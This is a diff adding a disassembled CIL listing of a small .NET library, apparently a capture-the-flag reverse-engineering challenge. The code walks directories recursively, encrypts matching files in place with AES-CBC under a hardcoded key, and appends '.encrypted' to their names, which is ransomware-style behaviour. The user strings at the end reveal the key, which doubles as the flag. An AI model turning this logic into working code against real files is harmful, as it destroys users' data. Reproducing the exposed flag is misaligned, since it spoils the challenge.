@@ -1,0 +1,161 @@
+Types:
+- .<Module> methods=0
+- ClassLibrary1.Class1 methods=4
+- ClassLibrary1.Encryption methods=3
+- .<PrivateImplementationDetails> methods=0
+- .__StaticArrayInitTypeSize=16 methods=0
+
+Methods:
+    1 ClassLibrary1.Class1::run rva=0x2048
+    2 ClassLibrary1.Class1::encryptFilesRecursive rva=0x2054
+    3 ClassLibrary1.Class1::.ctor rva=0x20d2
+    4 ClassLibrary1.Class1::.cctor rva=0x20da
+    5 ClassLibrary1.Encryption::encryptFile rva=0x20f4
+    6 ClassLibrary1.Encryption::.ctor rva=0x217a
+    7 ClassLibrary1.Encryption::.cctor rva=0x2182
+
+Method bodies:
+
+=== ClassLibrary1.Class1::run ===
+0001    28 10 00 00 0a      call           token(0x0A000010)    ; MemberRef::Directory.GetCurrentDirectory
+0006    28 02 00 00 06      call           token(0x06000002)    ; MethodDef::encryptFilesRecursive
+000B    2a                  ret            
+
+=== ClassLibrary1.Class1::encryptFilesRecursive ===
+000C    02                  ldarg.0        
+000D    28 11 00 00 0a      call           token(0x0A000011)    ; MemberRef::Directory.GetFiles
+0012    0a                  stloc.0        
+0013    16                  ldc.i4.0       
+0014    0b                  stloc.1        
+0015    2b 43               br.s           90
+0017    06                  ldloc.0        
+0018    07                  ldloc.1        
+0019    9a                  ldelem.ref     
+001A    0c                  stloc.2        
+001B    08                  ldloc.2        
+001C    17                  ldc.i4.1       
+001D    8d 17 00 00 01      newarr         token(0x01000017)    ; Token(0x01000017)
+0022    25                  dup            
+0023    16                  ldc.i4.0       
+0024    1f 2e               ldc.i4.s       46
+0026    9d                  stelem.i2      
+0027    6f 12 00 00 0a      callvirt       token(0x0A000012)    ; MemberRef::String.Split
+002C    28 01 00 00 2b      call           token(0x2B000001)    ; Token(0x2b000001)
+0031    0d                  stloc.3        
+0032    7e 01 00 00 04      ldsfld         token(0x04000001)    ; Field::TARGET_EXTENSIONS
+0037    09                  ldloc.3        
+0038    6f 14 00 00 0a      callvirt       token(0x0A000014)    ; MemberRef::?.ContainsKey
+003D    2c 17               brfalse.s      86
+003F    08                  ldloc.2        
+0040    28 05 00 00 06      call           token(0x06000005)    ; MethodDef::encryptFile
+0045    08                  ldloc.2        
+0046    08                  ldloc.2        
+0047    72 01 00 00 70      ldstr          string token(0x70000001)    ; UserString@0x1
+004C    28 15 00 00 0a      call           token(0x0A000015)    ; MemberRef::String.Concat
+0051    28 16 00 00 0a      call           token(0x0A000016)    ; MemberRef::File.Move
+0056    07                  ldloc.1        
+0057    17                  ldc.i4.1       
+0058    58                  add            
+0059    0b                  stloc.1        
+005A    07                  ldloc.1        
+005B    06                  ldloc.0        
+005C    8e                  ldlen          
+005D    69                  conv.i4        
+005E    32 b7               blt.s          23
+0060    02                  ldarg.0        
+0061    28 17 00 00 0a      call           token(0x0A000017)    ; MemberRef::Directory.GetDirectories
+0066    0a                  stloc.0        
+0067    16                  ldc.i4.0       
+0068    0b                  stloc.1        
+0069    2b 0c               br.s           119
+006B    06                  ldloc.0        
+006C    07                  ldloc.1        
+006D    9a                  ldelem.ref     
+006E    28 02 00 00 06      call           token(0x06000002)    ; MethodDef::encryptFilesRecursive
+0073    07                  ldloc.1        
+0074    17                  ldc.i4.1       
+0075    58                  add            
+0076    0b                  stloc.1        
+0077    07                  ldloc.1        
+0078    06                  ldloc.0        
+0079    8e                  ldlen          
+007A    69                  conv.i4        
+007B    32 ee               blt.s          107
+007D    2a                  ret            
+
+=== ClassLibrary1.Class1::.ctor ===
+0001    02                  ldarg.0        
+0002    28 18 00 00 0a      call           token(0x0A000018)    ; MemberRef::Object..ctor
+0007    2a                  ret            
+
+=== ClassLibrary1.Class1::.cctor ===
+0001    73 19 00 00 0a      newobj         token(0x0A000019)    ; MemberRef::?..ctor
+0006    25                  dup            
+0007    72 17 00 00 70      ldstr          string token(0x70000017)    ; UserString@0x17
+000C    17                  ldc.i4.1       
+000D    6f 1a 00 00 0a      callvirt       token(0x0A00001A)    ; MemberRef::?.Add
+0012    80 01 00 00 04      stsfld         token(0x04000001)    ; Field::TARGET_EXTENSIONS
+0017    2a                  ret            
+
+=== ClassLibrary1.Encryption::encryptFile ===
+000C    02                  ldarg.0        
+000D    28 1b 00 00 0a      call           token(0x0A00001B)    ; MemberRef::File.ReadAllBytes
+0012    0a                  stloc.0        
+0013    73 1c 00 00 0a      newobj         token(0x0A00001C)    ; MemberRef::AesEngine..ctor
+0018    73 1d 00 00 0a      newobj         token(0x0A00001D)    ; MemberRef::CbcBlockCipher..ctor
+001D    73 1e 00 00 0a      newobj         token(0x0A00001E)    ; MemberRef::PaddedBufferedBlockCipher..ctor
+0022    0b                  stloc.1        
+0023    28 1f 00 00 0a      call           token(0x0A00001F)    ; MemberRef::Encoding.get_UTF8
+0028    7e 02 00 00 04      ldsfld         token(0x04000002)    ; Field::KEY256
+002D    6f 20 00 00 0a      callvirt       token(0x0A000020)    ; MemberRef::Encoding.GetBytes
+0032    73 21 00 00 0a      newobj         token(0x0A000021)    ; MemberRef::KeyParameter..ctor
+0037    1f 10               ldc.i4.s       16
+0039    8d 21 00 00 01      newarr         token(0x01000021)    ; Token(0x01000021)
+003E    25                  dup            
+003F    d0 03 00 00 04      ldtoken        token(0x04000003)    ; Field::BE45CB2605BF36BEBDE684841A28F0FD43C69850A3DCE5FEDBA69928EE3A8991
+0044    28 22 00 00 0a      call           token(0x0A000022)    ; MemberRef::RuntimeHelpers.InitializeArray
+0049    16                  ldc.i4.0       
+004A    1f 10               ldc.i4.s       16
+004C    73 23 00 00 0a      newobj         token(0x0A000023)    ; MemberRef::ParametersWithIV..ctor
+0051    0c                  stloc.2        
+0052    07                  ldloc.1        
+0053    17                  ldc.i4.1       
+0054    08                  ldloc.2        
+0055    6f 24 00 00 0a      callvirt       token(0x0A000024)    ; MemberRef::BufferedCipherBase.Init
+005A    07                  ldloc.1        
+005B    06                  ldloc.0        
+005C    8e                  ldlen          
+005D    69                  conv.i4        
+005E    6f 25 00 00 0a      callvirt       token(0x0A000025)    ; MemberRef::BufferedCipherBase.GetOutputSize
+0063    8d 21 00 00 01      newarr         token(0x01000021)    ; Token(0x01000021)
+0068    0d                  stloc.3        
+0069    07                  ldloc.1        
+006A    06                  ldloc.0        
+006B    09                  ldloc.3        
+006C    16                  ldc.i4.0       
+006D    6f 26 00 00 0a      callvirt       token(0x0A000026)    ; MemberRef::BufferedCipherBase.ProcessBytes
+0072    13 04               stloc.s        local(0x0004)
+0074    07                  ldloc.1        
+0075    09                  ldloc.3        
+0076    11 04               ldloc.s        local(0x0004)
+0078    6f 27 00 00 0a      callvirt       token(0x0A000027)    ; MemberRef::BufferedCipherBase.DoFinal
+007D    26                  pop            
+007E    02                  ldarg.0        
+007F    09                  ldloc.3        
+0080    28 28 00 00 0a      call           token(0x0A000028)    ; MemberRef::File.WriteAllBytes
+0085    2a                  ret            
+
+=== ClassLibrary1.Encryption::.ctor ===
+0001    02                  ldarg.0        
+0002    28 18 00 00 0a      call           token(0x0A000018)    ; MemberRef::Object..ctor
+0007    2a                  ret            
+
+=== ClassLibrary1.Encryption::.cctor ===
+0001    72 23 00 00 70      ldstr          string token(0x70000023)    ; UserString@0x23
+0006    80 02 00 00 04      stsfld         token(0x04000002)    ; Field::KEY256
+000B    2a                  ret            
+
+Used user strings:
+- 0x1: '.encrypted'
+- 0x17: 'CSCPT'
+- 0x23: 'CSCPT{k33p_g01nG_u4r3_d01nG_Gr8}'
